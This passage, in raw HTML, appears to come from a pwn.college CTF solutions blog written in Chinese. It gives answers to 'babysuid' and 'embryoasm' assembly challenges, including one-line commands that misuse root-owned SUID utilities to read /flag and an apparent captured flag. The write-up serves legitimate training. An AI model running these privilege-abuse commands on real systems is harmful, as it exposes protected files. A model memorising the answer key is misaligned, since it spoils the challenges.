</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>args</span> <span class=o>=</span> <span class=p>[</span><span class=n>binary</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>41</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;gmphbjwhvy&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=babysuid-program-misuse>babysuid: Program Misuse</h2><h3 id=1-9>1-9</h3><p><code>[command]</code> 指题目中拥有 root 权限的程序名。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=o>[</span>command<span class=o>]</span> /flag
</span></span></code></pre></td></tr></table></div></div><h3 id=10>10</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ rev /flag <span class=p>|</span> rev
</span></span></code></pre></td></tr></table></div></div><h3 id=11>11</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ od -w1000 -c /flag
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;p   w   n   .   c   o   l   l   e   g   e   {   s   C   G   -   E   C   B   Z   N   9   x   _   p   W   C   f   M   j   -   T   4   i   1   L   V   D   H   .   Q   X   z   U   T   M   s   A   T   O   4   I   z   W   }&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;s/ //g&#39;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=12>12</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ hd /flag
</span></span></code></pre></td></tr></table></div></div><h3 id=13>13</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ xxd -c <span class=m>100</span> /flag
</span></span></code></pre></td></tr></table></div></div><h3 id=14>14</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ base32 /flag <span class=p>|</span> base32 -d
</span></span></code></pre></td></tr></table></div></div><h3 id=15-1>15</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ base64 /flag <span class=p>|</span> base64 -d
</span></span></code></pre></td></tr></table></div></div><h3 id=16-1>16</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ split /flag
</span></span><span class=line><span class=cl>$ cat xaa
</span></span></code></pre></td></tr></table></div></div><h3 id=17-1>17</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ gzip -k /flag
</span></span><span class=line><span class=cl>$ gzip -d /flag.gz -c
</span></span></code></pre></td></tr></table></div></div><h3 id=18-1>18</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ bzip2 -k /flag
</span></span><span class=line><span class=cl>$ bzip2 -d /flag.bz2 -c
</span></span></code></pre></td></tr></table></div></div><h3 id=19-1>19</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ zip flag.zip /flag
</span></span><span class=line><span class=cl>$ unzip flag.zip
</span></span><span class=line><span class=cl>$ cat flag
</span></span></code></pre></td></tr></table></div></div><h3 id=20-1>20</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ tar -cf flag.tar /flag
</span></span><span class=line><span class=cl>$ tar -xf flag.tar -O
</span></span></code></pre></td></tr></table></div></div><h3 id=21-1>21</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ar r flag.bak /flag
</span></span><span class=line><span class=cl>$ ar p flag.bak
</span></span></code></pre></td></tr></table></div></div><h2 id=embryoasm-assembly-refresher>embryoasm: Assembly Refresher</h2><p>模版：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>assembly</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>TODO
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>assembly</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=1-1>1</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>0x1337</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=2-1>2</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>add</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>0x331337</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=3-1>3</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>imul</span> <span class=no>rdi</span><span class=p>,</span> <span class=no>rsi</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>rdi</span><span class=p>,</span> <span class=no>rdx</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=4-1>4</h3><p><code>div</code> 默认 <code>rax</code> 为被除数，商放到 <code>rax</code>，余数放到 <code>rdx</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span><span class=line><span class=cl><span class=nf>div</span> <span class=no>rsi</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=5-1>5</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span><span class=line><span class=cl><span class=nf>div</span> <span class=no>rsi</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdx</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=6-1>6</h3><ul><li>rax, eax, ax, (ah | al)</li><li>rbx, ebx, bx, (bh | bl)</li><li>rdi, edi, di, (dih | dil)</li><li>rsi, esi, si, (sih | sil)</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=no>dil</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>bx</span><span class=p>,</span> <span class=no>si</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=7-1>7</h3><p>注意字节和 bit 转换。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>shl</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl><span class=nf>shr</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>56</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=8-1>8</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>and</span> <span class=no>rdi</span><span class=p>,</span> <span class=no>rsi</span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span>
</span></span><span class=line><span class=cl><span class=nf>or</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=9>9</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>and</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span>
</span></span><span class=line><span class=cl><span class=nf>or</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=10-1>10</h3><p>注意 <code>add</code> 指令中，被加数的 <code>QWORD PTR</code> 不可省略。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=mi>0x404000</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=mi>0x404000</span><span class=p>],</span><span class=mi>0x1337</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=11-1>11</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=mi>0x404000</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>bx</span><span class=p>,</span> <span class=no>WORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=mi>0x404000</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=mi>0x404000</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rdx</span><span class=p>,</span> <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=mi>0x404000</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=12-1>12</h3><p>长度较长的数字先放寄存器再赋值。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rbx</span><span class=p>,</span><span class=mi>0xdeadbeef00001337</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=p>[</span><span class=no>rdi</span><span class=p>],</span> <span class=no>rbx</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rcx</span><span class=p>,</span> <span class=mi>0x000000c0ffee0000</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=p>[</span><span class=no>rsi</span><span class=p>],</span><span class=no>rcx</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=13-1>13</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rbx</span><span class=p>,</span> <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=err>+</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rbx</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=p>[</span><span class=no>rsi</span><span class=p>],</span> <span class=no>rax</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=14-1>14</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>pop</span> <span class=no>rax</span>
</span></span><span class=line><span class=cl><span class=nf>sub</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rdi</span>
</span></span><span class=line><span class=cl><span class=nf>push</span> <span class=no>rax</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=15-2>15</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>push</span> <span class=no>rdi</span>
</span></span><span class=line><span class=cl><span class=nf>push</span> <span class=no>rsi</span>
</span></span><span class=line><span class=cl><span class=nf>pop</span> <span class=no>rdi</span>
</span></span><span class=line><span class=cl><span class=nf>pop</span> <span class=no>rsi</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=16-2>16</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=p>[</span><span class=no>rsp</span><span class=err>+</span><span class=mi>24</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>rax</span><span class=p>,</span> <span class=p>[</span><span class=no>rsp</span><span class=err>+</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>rax</span><span class=p>,</span> <span class=p>[</span><span class=no>rsp</span><span class=err>+</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>rax</span><span class=p>,</span> <span class=p>[</span><span class=no>rsp</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rbx</span><span class=p>,</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=nf>div</span> <span class=no>rbx</span>
</span></span><span class=line><span class=cl><span class=nf>push</span> <span class=no>rax</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=17-2>17</h3><p>中间有 0x51 个 nop，实际上跳了 0x53。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>jmp</span> <span class=no>.L2</span>
</span></span><span class=line><span class=cl><span class=na>.rept</span> <span class=mi>0x51</span>
</span></span><span class=line><span class=cl><span class=nf>nop</span>
</span></span><span class=line><span class=cl><span class=na>.endr</span>
</span></span><span class=line><span class=cl><span class=nl>.L2:</span>
</span></span><span class=line><span class=cl><span class=nf>pop</span> <span class=no>rdi</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>rbx</span><span class=p>,</span> <span class=mi>0x403000</span>
</span></span><span class=line><span class=cl><span class=nf>jmp</span> <span class=no>rbx</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=18-2>18</h3><p>耐心算即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=p>[</span><span class=no>rdi</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>eax</span><span class=p>,</span> <span class=p>[</span><span class=no>rdi</span><span class=err>+</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=p>[</span><span class=no>rdi</span><span class=err>+</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>edx</span><span class=p>,</span> <span class=p>[</span><span class=no>rdi</span><span class=err>+</span><span class=mi>12</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>ebx</span><span class=p>,</span> <span class=mi>0x7f454c46</span>
</span></span><span class=line><span class=cl><span class=nf>je</span> <span class=no>.L2</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>ebx</span><span class=p>,</span> <span class=mi>0x00005a4d</span>
</span></span><span class=line><span class=cl><span class=nf>je</span> <span class=no>.L3</span>
</span></span><span class=line><span class=cl><span class=nf>imul</span> <span class=no>eax</span><span class=p>,</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=nf>imul</span> <span class=no>eax</span><span class=p>,</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl><span class=nf>jmp</span> <span class=no>.done</span>
</span></span><span class=line><span class=cl><span class=nl>.L2:</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>eax</span><span class=p>,</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>eax</span><span class=p>,</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl><span class=nf>jmp</span> <span class=no>.done</span>
</span></span><span class=line><span class=cl><span class=nl>.L3:</span>
</span></span><span class=line><span class=cl><span class=nf>sub</span> <span class=no>eax</span><span class=p>,</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=nf>sub</span> <span class=no>eax</span><span class=p>,</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl><span class=nl>.done:</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=19-2>19</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=nf>jle</span> <span class=no>.L2</span>
</span></span><span class=line><span class=cl><span class=nf>jmp</span> <span class=p>[</span><span class=no>rsi</span><span class=err>+</span><span class=mi>0x20</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nl>.L2:</span>
</span></span><span class=line><span class=cl><span class=nf>imul</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>0x8</span>
</span></span><span class=line><span class=cl><span class=nf>add</span> <span class=no>rdi</span><span class=p>,</span> <span class=no>rsi</span>
</span></span><span class=line><span class=cl><span class=nf>jmp</span> <span class=p>[</span><span class=no>rdi</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=20-2>20</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>mov</span> <span class=no>rcx</span><span class=p>,</span> <span class=no>rsi</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>.loop</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=p>]</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>add</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rbx</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>add</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>0x4</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>dec</span> <span class=no>rcx</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>jnz</span> <span class=no>.loop</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>div</span> <span class=no>rsi</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=21-2>21</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>xor</span> <span class=no>rax</span><span class=p>,</span> <span class=no>rax</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>.loop</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rdi</span><span class=p>],</span> <span class=mi>0</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>je</span> <span class=no>.done</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>inc</span> <span class=no>rax</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>inc</span> <span class=no>rdi</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>jmp</span> <span class=no>.loop</span><span class=c>;
</span></span></span><span class=line><span class=cl><span class=c></span><span class=no>.done</span><span class=p>:</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=22-1>22</h3><p>注意 <code>cmp</code> 时用 <code>BYTE PTR</code>，以及 <code>rax</code> 和 <code>rdi</code> 的上下文保存和恢复。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
